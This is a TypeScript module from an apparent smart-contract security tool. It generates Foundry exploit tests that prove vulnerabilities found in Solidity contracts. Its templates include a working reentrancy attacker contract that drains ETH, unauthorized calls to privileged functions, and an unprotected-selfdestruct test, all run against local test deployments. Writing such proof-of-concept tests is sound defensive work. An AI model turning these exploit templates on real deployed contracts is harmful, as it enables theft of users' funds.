import * as fs from 'fs';
import * as path from 'path';
import { Vulnerability, ExploitProof, FunctionInfo } from './types';

export function generateExploitProofs(
  vulnerabilities: Vulnerability[],
  contractName: string,
  sourceFilePath: string,
  outputDir: string
): ExploitProof[] {
  const proofs: ExploitProof[] = [];

  // Ensure output directory exists
  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }

  for (const vuln of vulnerabilities) {
    if (!vuln.exploitable) continue;

    let proof: ExploitProof | null = null;

    switch (vuln.type) {
      case 'reentrancy':
        proof = generateReentrancyExploit(vuln, contractName, sourceFilePath, outputDir);
        break;
      case 'access-control':
        proof = generateAccessControlExploit(vuln, contractName, sourceFilePath, outputDir);
        break;
      case 'unprotected-selfdestruct':
        proof = generateSelfdestructExploit(vuln, contractName, sourceFilePath, outputDir);
        break;
      case 'integer-overflow':
      case 'integer-underflow':
        proof = generateOverflowExploit(vuln, contractName, sourceFilePath, outputDir);
        break;
    }

    if (proof) {
      // Write the test file
      fs.writeFileSync(proof.testFilePath, proof.testCode);
      proofs.push(proof);
    }
  }

  return proofs;
}

function generateReentrancyExploit(
  vuln: Vulnerability,
  contractName: string,
  sourceFilePath: string,
  outputDir: string
): ExploitProof | null {
  const funcName = vuln.location.functionName || 'withdraw';

  // Only generate exploits for simple withdraw functions (no parameters)
  // Functions with parameters need manual adjustment
  if (funcName !== 'withdraw') {
    return null; // Skip functions with parameters for now
  }

  const testFileName = `exploit_reentrancy_${funcName}.t.sol`;
  const testFilePath = path.join(outputDir, testFileName);

  // Calculate relative path from output dir to source file
  const relativeSourcePath = path.relative(outputDir, sourceFilePath).replace(/\\/g, '/');

  const testCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "${relativeSourcePath}";

/**
 * @title Reentrancy Exploit Test
 * @notice Demonstrates reentrancy vulnerability in ${contractName}.${funcName}()
 * @dev Generated by Smart Contract Attack Simulator
 *
 * Vulnerability: ${vuln.description}
 * Location: Line ${vuln.location.line}
 */
contract ReentrancyExploitTest is Test {
    ${contractName} public target;
    AttackerContract public attacker;

    address public victim = address(0x1);
    address public attackerEOA = address(0x2);

    uint256 constant INITIAL_BALANCE = 10 ether;
    uint256 constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        // Deploy the vulnerable contract
        target = new ${contractName}();

        // Deploy the attacker contract
        attacker = new AttackerContract(payable(address(target)));

        // Fund the victim and have them deposit
        vm.deal(victim, INITIAL_BALANCE);
        vm.prank(victim);
        target.deposit{value: DEPOSIT_AMOUNT}();

        // Fund the attacker
        vm.deal(attackerEOA, INITIAL_BALANCE);
    }

    function testReentrancyExploit() public {
        // Record initial balances
        uint256 targetInitialBalance = address(target).balance;
        uint256 attackerInitialBalance = address(attacker).balance;

        console.log("=== Reentrancy Attack Simulation ===");
        console.log("Target contract balance before attack:", targetInitialBalance);
        console.log("Attacker balance before attack:", attackerInitialBalance);

        // Execute the attack
        vm.prank(attackerEOA);
        attacker.attack{value: DEPOSIT_AMOUNT}();

        // Verify the attack succeeded
        uint256 targetFinalBalance = address(target).balance;
        uint256 attackerFinalBalance = address(attacker).balance;

        console.log("Target contract balance after attack:", targetFinalBalance);
        console.log("Attacker balance after attack:", attackerFinalBalance);
        console.log("ETH drained:", targetInitialBalance - targetFinalBalance);

        // Assert that funds were drained
        assertLt(targetFinalBalance, targetInitialBalance, "Attack should drain funds from target");
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker should gain funds");

        console.log("=== EXPLOIT SUCCESSFUL ===");
    }
}

/**
 * @title Attacker Contract
 * @notice Malicious contract that exploits reentrancy
 */
contract AttackerContract {
    ${contractName} public target;
    uint256 public attackCount;
    uint256 constant MAX_ATTACKS = 5; // Limit recursion for gas

    constructor(address payable _target) {
        target = ${contractName}(_target);
    }

    function attack() external payable {
        // Deposit to become eligible for withdrawal
        target.deposit{value: msg.value}();

        // Trigger the vulnerable withdraw function
        target.${funcName}();
    }

    // Fallback function that re-enters the vulnerable contract
    receive() external payable {
        if (attackCount < MAX_ATTACKS && address(target).balance >= msg.value) {
            attackCount++;
            target.${funcName}();
        }
    }

    fallback() external payable {
        if (attackCount < MAX_ATTACKS && address(target).balance >= msg.value) {
            attackCount++;
            target.${funcName}();
        }
    }
}
`;

  return {
    vulnerability: vuln,
    testFilePath,
    testCode,
    expectedResult: 'Attacker drains funds via recursive calls',
    estimatedGasCost: 250000,
  };
}

function generateAccessControlExploit(
  vuln: Vulnerability,
  contractName: string,
  sourceFilePath: string,
  outputDir: string
): ExploitProof | null {
  const funcName = vuln.location.functionName || 'sensitiveFunction';

  // Only generate exploits for no-parameter functions like pause/unpause
  // Functions with parameters need manual adjustment
  const noParamFunctions = ['pause', 'unpause', 'kill', 'destroy'];
  if (!noParamFunctions.includes(funcName)) {
    return null; // Skip functions with parameters
  }

  const testFileName = `exploit_access_control_${funcName}.t.sol`;
  const testFilePath = path.join(outputDir, testFileName);

  const relativeSourcePath = path.relative(outputDir, sourceFilePath).replace(/\\/g, '/');

  const testCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "${relativeSourcePath}";

/**
 * @title Access Control Exploit Test
 * @notice Demonstrates missing access control in ${contractName}.${funcName}()
 * @dev Generated by Smart Contract Attack Simulator
 *
 * Vulnerability: ${vuln.description}
 * Location: Line ${vuln.location.line}
 */
contract AccessControlExploitTest_${funcName} is Test {
    ${contractName} public target;

    address public owner = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        // Deploy as owner
        vm.prank(owner);
        target = new ${contractName}();

        // Fund the contract
        vm.deal(address(target), 10 ether);
        vm.deal(attacker, 1 ether);
    }

    function testAccessControlExploit_${funcName}() public {
        console.log("=== Access Control Attack Simulation ===");
        console.log("Attacker address:", attacker);
        console.log("Owner address:", owner);

        // Attacker calls the sensitive function without authorization
        vm.prank(attacker);

        // This should NOT be allowed but the vulnerability lets it through
        target.${funcName}();

        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Attacker successfully called ${funcName}() without authorization!");
    }
}
`;

  return {
    vulnerability: vuln,
    testFilePath,
    testCode,
    expectedResult: 'Unauthorized address calls privileged function',
    estimatedGasCost: 50000,
  };
}

function generateSelfdestructExploit(
  vuln: Vulnerability,
  contractName: string,
  sourceFilePath: string,
  outputDir: string
): ExploitProof {
  const funcName = vuln.location.functionName || 'destroy';
  const testFileName = `exploit_selfdestruct_${funcName}.t.sol`;
  const testFilePath = path.join(outputDir, testFileName);

  const relativeSourcePath = path.relative(outputDir, sourceFilePath).replace(/\\/g, '/');

  const testCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "${relativeSourcePath}";

/**
 * @title Selfdestruct Exploit Test
 * @notice Demonstrates unprotected selfdestruct in ${contractName}.${funcName}()
 * @dev Generated by Smart Contract Attack Simulator
 *
 * Vulnerability: ${vuln.description}
 * Location: Line ${vuln.location.line}
 */
contract SelfdestructExploitTest is Test {
    ${contractName} public target;

    address public owner = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        // Deploy as owner
        vm.prank(owner);
        target = new ${contractName}();

        // Fund the contract with ETH
        vm.deal(address(target), 10 ether);
        vm.deal(attacker, 1 ether);
    }

    function testSelfdestructExploit() public {
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attacker.balance;

        console.log("=== Selfdestruct Attack Simulation ===");
        console.log("Target balance before:", targetBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Target contract code size before:", address(target).code.length);

        // Attacker calls selfdestruct function
        vm.prank(attacker);
        target.${funcName}();

        uint256 attackerBalanceAfter = attacker.balance;

        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Target contract code size after:", address(target).code.length);

        // Verify contract was destroyed and attacker received funds
        assertEq(address(target).code.length, 0, "Contract should be destroyed");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should receive contract funds");

        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Contract destroyed! ETH stolen:", attackerBalanceAfter - attackerBalanceBefore);
    }
}
`;

  return {
    vulnerability: vuln,
    testFilePath,
    testCode,
    expectedResult: 'Contract destroyed and ETH stolen',
    estimatedGasCost: 30000,
  };
}

function generateOverflowExploit(
  vuln: Vulnerability,
  contractName: string,
  sourceFilePath: string,
  outputDir: string
): ExploitProof {
  const funcName = vuln.location.functionName || 'calculate';
  const isOverflow = vuln.type === 'integer-overflow';
  const testFileName = `exploit_${isOverflow ? 'overflow' : 'underflow'}_${funcName}.t.sol`;
  const testFilePath = path.join(outputDir, testFileName);

  const relativeSourcePath = path.relative(outputDir, sourceFilePath).replace(/\\/g, '/');

  const testCode = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "${relativeSourcePath}";

/**
 * @title Integer ${isOverflow ? 'Overflow' : 'Underflow'} Exploit Test
 * @notice Demonstrates integer ${isOverflow ? 'overflow' : 'underflow'} in ${contractName}.${funcName}()
 * @dev Generated by Smart Contract Attack Simulator
 *
 * Vulnerability: ${vuln.description}
 * Location: Line ${vuln.location.line}
 */
contract ${isOverflow ? 'Overflow' : 'Underflow'}ExploitTest is Test {
    ${contractName} public target;

    address public attacker = address(0x1);

    function setUp() public {
        target = new ${contractName}();
        vm.deal(attacker, 10 ether);
    }

    function test${isOverflow ? 'Overflow' : 'Underflow'}Exploit() public {
        console.log("=== Integer ${isOverflow ? 'Overflow' : 'Underflow'} Attack Simulation ===");

        // ${isOverflow ? 'Try to cause overflow by supplying max values' : 'Try to cause underflow by subtracting more than available'}
        vm.prank(attacker);

        // Note: Adjust these values based on the actual function parameters
        ${isOverflow
          ? '// uint256 maxValue = type(uint256).max;\n        // target.someFunction(maxValue, 1); // This would overflow to 0'
          : '// target.someFunction(0, 1); // This would underflow to max uint256'}

        console.log("Test setup complete - manual verification required");
        console.log("The function at line ${vuln.location.line} may be vulnerable to ${isOverflow ? 'overflow' : 'underflow'}");
    }
}
`;

  return {
    vulnerability: vuln,
    testFilePath,
    testCode,
    expectedResult: `Integer ${isOverflow ? 'overflow' : 'underflow'} bypasses validation`,
    estimatedGasCost: 40000,
  };
}
